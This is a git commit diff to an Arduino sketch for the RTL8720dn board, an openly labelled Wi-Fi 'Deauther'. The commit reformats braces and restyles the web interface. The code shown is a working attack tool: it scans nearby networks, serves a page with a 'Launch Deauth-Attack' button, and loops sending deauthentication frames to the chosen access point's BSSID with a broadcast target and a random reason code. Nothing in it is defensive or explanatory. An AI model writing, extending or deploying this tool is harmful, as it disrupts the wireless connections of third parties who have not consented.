a61ae40da93bb0856ba34ffefce0f091a29a1697
n0tAv1ru5 <ducmanh0424@gmail.com>
2024-11-13 02:12:32 +0700

    Fix bugs/ Update CSS

--- RTL8720dn-Deauther.ino
+++ RTL8720dn-Deauther.ino
@@ -14,8 +14,7 @@
 //  Green: Web Server communication happening
 //  Blue: Deauth-Frame being sent
 
-typedef struct
-{
+typedef struct {
   String ssid;
   String bssid_str;
   uint8_t bssid[6];
@@ -34,11 +33,9 @@ uint8_t deauth_bssid[6];
 uint16_t deauth_reason;
 int LED_cnt = 0;
 
-rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result)
-{
+rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
   rtw_scan_result_t *record;
-  if (scan_result->scan_complete == 0)
-  {
+  if (scan_result->scan_complete == 0) {
     record = &scan_result->ap_details;
     record->SSID.val[record->SSID.len] = 0;
     WiFiScanResult result;
@@ -54,37 +51,30 @@ rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result)
   return RTW_SUCCESS;
 }
 
-int scanNetworks()
-{
+int scanNetworks() {
   DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
   scan_results.clear();
-  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS)
-  {
+  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     delay(5000);
     DEBUG_SER_PRINT(" done!\n");
     return 0;
-  }
-  else
-  {
+  } else {
     DEBUG_SER_PRINT(" failed!\n");
     return 1;
   }
 }
 
-String parseRequest(String request)
-{
+String parseRequest(String request) {
   int path_start = request.indexOf(' ') + 1;
   int path_end = request.indexOf(' ', path_start);
   return request.substring(path_start, path_end);
 }
 
-std::map<String, String> parsePost(String &request)
-{
+std::map<String, String> parsePost(String &request) {
   std::map<String, String> post_params;
 
   int body_start = request.indexOf("\r\n\r\n");
-  if (body_start == -1)
-  {
+  if (body_start == -1) {
     return post_params;
   }
   body_start += 4;
@@ -94,13 +84,11 @@ std::map<String, String> parsePost(String &request)
   int start = 0;
   int end = post_data.indexOf('&', start);
 
-  while (end != -1)
-  {
+  while (end != -1) {
     String key_value_pair = post_data.substring(start, end);
     int delimiter_position = key_value_pair.indexOf('=');
 
-    if (delimiter_position != -1)
-    {
+    if (delimiter_position != -1) {
       String key = key_value_pair.substring(0, delimiter_position);
       String value = key_value_pair.substring(delimiter_position + 1);
       post_params[key] = value;
@@ -112,8 +100,7 @@ std::map<String, String> parsePost(String &request)
 
   String key_value_pair = post_data.substring(start);
   int delimiter_position = key_value_pair.indexOf('=');
-  if (delimiter_position != -1)
-  {
+  if (delimiter_position != -1) {
     String key = key_value_pair.substring(0, delimiter_position);
     String value = key_value_pair.substring(delimiter_position + 1);
     post_params[key] = value;
@@ -122,122 +109,63 @@ std::map<String, String> parsePost(String &request)
   return post_params;
 }
 
-String makeResponse(int code, String content_type)
-{
+
+String makeResponse(int code, String content_type) {
   String response = "HTTP/1.1 " + String(code) + " OK\n";
   response += "Content-Type: " + content_type + "\n";
   response += "Connection: close\n\n";
   return response;
 }
 
-String makeRedirect(String url)
-{
+String makeRedirect(String url) {
   String response = "HTTP/1.1 307 Temporary Redirect\n";
   response += "Location: " + url;
   return response;
 }
 
-void handleRoot(WiFiClient &client)
-{
+
+
+void handleRoot(WiFiClient &client) {
   String html = "<html><head>";
+
+  // Adding CSS for styling
   html += "<style>";
-
-  // Add css
-  html += "body {"
-          "  background-color: #121212;"
-          "  color: #e0e0e0;"
-          "  font-family: Arial, sans-serif;"
-          "  margin: 0;"
-          "  padding: 0;"
-          "  text-align: center;"
-          "}";
-
-  html += "h1, h2 {"
-          "  color: #76c7c0;"
-          "}";
-
-  html += "table {"
-          "  width: 80%;"
-          "  margin: 20px auto;"
-          "  border-collapse: collapse;"
-          "}";
-
-  html += "th, td {"
-          "  padding: 10px;"
-          "  text-align: left;"
-          "  border: 1px solid #333;"
-          "}";
-
-  html += "tr:nth-child(even) {"
-          "  background-color: #333;"
-          "}";
-
-  html += "tr:nth-child(odd) {"
-          "  background-color: #444;"
-          "}";
-
-  html += "th {"
-          "  background-color: #333;"
-          "  color: #76c7c0;"
-          "}";
-
-  html += "input[type='text'], input[type='submit'], select {"
-          "  padding: 10px;"
-          "  margin: 10px 0;"
-          "  background-color: #333;"
-          "  border: 1px solid #444;"
-          "  color: #e0e0e0;"
-          "  border-radius: 5px;"
-          "  font-size: 16px;"
-          "}";
-
-  html += "input[type='submit'] {"
-          "  background-color: #76c7c0;"
-          "  cursor: pointer;"
-          "  transition: background-color 0.3s;"
-          "}";
-
-  html += "input[type='submit']:hover {"
-          "  background-color: #4a8884;"
-          "}";
-
-  html += "form {"
-          "  margin: 20px auto;"
-          "  width: 60%;"
-          "}";
-
-  html += "a {"
-          "  color: #76c7c0;"
-          "  text-decoration: none;"
-          "  font-size: 16px;"
-          "}";
-
-  html += "a:hover {"
-          "  color: #4a8884;"
-          "}";
-
+  html += "body { background-color: #36454F; color: white; font-family: Arial, sans-serif; text-align: center; }";
+  html += "h1 { color: #3488ce; font-size: 42px; }";       
+  html += "h2 { color: #3488ce; font-size: 36px; }";                                                  
+  html += "table { width: 100%; border-collapse: collapse; margin: 20px 0; text-align: left; margin: 0 auto; }";  // Center the table
+  html += "th, td { padding: 10px; border: 1px solid #ddd; }";
+  html += "th { background-color: #2c3e50; }";
+  html += "tr:nth-child(even) { background-color: #34495e; }";
+  html += "input[type='radio'] { margin: 10px; }";
+  html += "input[type='submit'] { background-color: #3488ce; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 10px; font-size: 20px; }";
+  html += "input[type='submit']:hover { background-color: #3170de; }";                 // Button hover effect
+  html += ".button-container { display: flex; justify-content: center; gap: 10px; }";  // Center buttons in a row
   html += "</style>";
-  html += "</head><body>";
 
+  html += "</head><body>";
   html += "<h1>RTL8720dn-Deauther</h1>";
   html += "<h2>WiFi Networks:</h2>";
-
-  // Remove reason input box
   html += "<form method='post' action='/deauth'>";
+  html += "<table><tr><th>Select</th><th>SSID</th><th>BSSID</th><th>Channel</th><th>RSSI</th><th>Frequency</th></tr>";
 
-  // Make check box for AP
-  for (int i = 0; i < scan_results.size(); i++)
-  {
-    html += "<input type='checkbox' name='net_num' value='" + String(i) + "'> " + scan_results[i].ssid + " (" + scan_results[i].bssid_str + ")<br>";
+  // Create a radio button for each network and only allow one selection
+  for (int i = 0; i < scan_results.size(); i++) {
+    html += "<tr><td><input type='radio' name='net_num' value='" + String(i) + "' " + (i == 0 ? "checked" : "") + "></td>";
+    html += "<td>" + scan_results[i].ssid + "</td><td>" + scan_results[i].bssid_str + "</td><td>" + String(scan_results[i].channel) + "</td><td>" + String(scan_results[i].rssi) + "</td><td>" + ((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td></tr>";
   }
 
-  html += "<br><input type='submit' value='Launch Deauth-Attack'>";
+  html += "</table>";
+
+  // Container to center buttons in one row
+  html += "<div class='button-container'>";
+  html += "<input type='submit' value='Launch Deauth-Attack'>";
+  html += "</div>";
+
   html += "</form>";
 
-  html += "<form method='post' action='/stop'><input type='submit' value='Stop Deauth-Attack'></form>";
-
-  // Rescan button
-  html += "<form method='post' action='/rescan'><input type='submit' value='Rescan'></form>";
+  html += "<form method='post' action='/rescan'><div class='button-container'><input type='submit' value='Rescan networks'></div></form>";
+  html += "<form method='post' action='/stop'><div class='button-container'><input type='submit' value='Stop Deauth-Attack'></div></form><hr>";
 
   html += "</body></html>";
 
@@ -246,15 +174,15 @@ void handleRoot(WiFiClient &client)
   client.write(response.c_str());
 }
 
-void handle404(WiFiClient &client)
-{
+
+
+void handle404(WiFiClient &client) {
   String response = makeResponse(404, "text/plain");
   response += "Not found!";
   client.write(response.c_str());
 }
 
-void startDeauth(int network_num)
-{
+void startDeauth(int network_num) {
   digitalWrite(LED_R, LOW);
   current_channel = scan_results[network_num].channel;
   wifi_off();
@@ -264,11 +192,10 @@ void startDeauth(int network_num)
   deauth_running = true;
   memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
   DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
-  // digitalWrite(LED_R, HIGH);
+  digitalWrite(LED_R, HIGH);
 }
 
-void setup()
-{
+void setup() {
   pinMode(LED_R, OUTPUT);
   pinMode(LED_G, OUTPUT);
   pinMode(LED_B, OUTPUT);
@@ -277,20 +204,15 @@ void setup()
 
   DEBUG_SER_INIT();
   WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
-  if (scanNetworks() != 0)
-  {
-    while (true)
-      delay(1000);
+  if (scanNetworks() != 0) {
+    while (true) delay(1000);
   }
 
 #ifdef DEBUG
-  for (uint i = 0; i < scan_results.size(); i++)
-  {
+  for (uint i = 0; i < scan_results.size(); i++) {
     DEBUG_SER_PRINT(scan_results[i].ssid + " ");
-    for (int j = 0; j < 6; j++)
-    {
-      if (j > 0)
-        DEBUG_SER_PRINT(":");
+    for (int j = 0; j < 6; j++) {
+      if (j > 0) DEBUG_SER_PRINT(":");
       DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
     }
     DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
@@ -303,94 +225,67 @@ void setup()
   digitalWrite(LED_R, HIGH);
 }
 
-void loop()
-{
+void loop() {
   WiFiClient client = server.available();
-  if (client.connected())
-  {
+  if (client.connected()) {
     digitalWrite(LED_G, HIGH);
-
     String request;
-    while (client.available())
-    {
-      while (client.available())
-        request += (char)client.read();
+    while (client.available()) {
+      while (client.available()) request += (char)client.read();
       delay(1);
     }
     DEBUG_SER_PRINT(request);
     String path = parseRequest(request);
     DEBUG_SER_PRINT("Requested path: " + path + "\n");
 
-    if (path == "/")
-    {
+    if (path == "/") {
       handleRoot(client);
-    }
-    else if (path == "/rescan")
-    {
+    } else if (path == "/rescan") {
       client.write(makeRedirect("/").c_str());
-      digitalWrite(LED_R, LOW);
-      if (scanNetworks() != 0)
-      {
-        while (true)
-          delay(1000);
+      if (scanNetworks() != 0) {
+        while (true) delay(1000);
       }
-      digitalWrite(LED_R, HIGH);
-    }
-    else if (path == "/deauth")
-    {
+    } else if (path == "/deauth") {
       std::map<String, String> post_data = parsePost(request);
       int network_num;
       bool post_valid = true;
-      if (post_data.size() == 1)
-      { // Chỉ nhận 1 tham số là 'net_num'
-        if (post_data.find("net_num") != post_data.end())
-        {
-          network_num = String(post_data["net_num"]).toInt();
-          deauth_reason = random(0, 25); // Sinh lý do ngẫu nhiên từ 0 đến 24
+      if (post_data.size() == 1) {
+        for (auto &param : post_data) {
+          if (param.first == "net_num") {
+            network_num = String(param.second).toInt();
+            deauth_reason = random(0, 25);
+          } else {
+            post_valid = false;
+            break;
+          }
         }
-        else
-        {
-          post_valid = false;
-        }
-      }
-      else
-      {
+      } else {
         post_valid = false;
       }
-      if (post_valid)
-      {
+      client.write(makeRedirect("/").c_str());
+      if (post_valid) {
         startDeauth(network_num);
-        client.write(makeRedirect("/").c_str());
-      }
-      else
-      {
+      } else {
         DEBUG_SER_PRINT("Received invalid post request!\n");
       }
-      client.write(makeRedirect("/").c_str());
-    }
-    else if (path == "/stop")
-    {
+    } else if (path == "/stop") {
       deauth_running = false;
+      digitalWrite(LED_B, LOW);
       DEBUG_SER_PRINT("Deauth-Attack stopped!");
       client.write(makeRedirect("/").c_str());
-    }
-    else
-    {
+    } else {
       handle404(client);
     }
 
     client.stop();
     digitalWrite(LED_G, LOW);
   }
-  if (deauth_running)
-  {
-    // Decrease led speed
+  if (deauth_running) {
     LED_cnt++;
     digitalWrite(LED_B, HIGH);
     wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
     delay(50);
-    if (LED_cnt % 10 == 0)
-    {
+    if (LED_cnt % 10 == 0) {
       digitalWrite(LED_B, LOW);
     }
   }
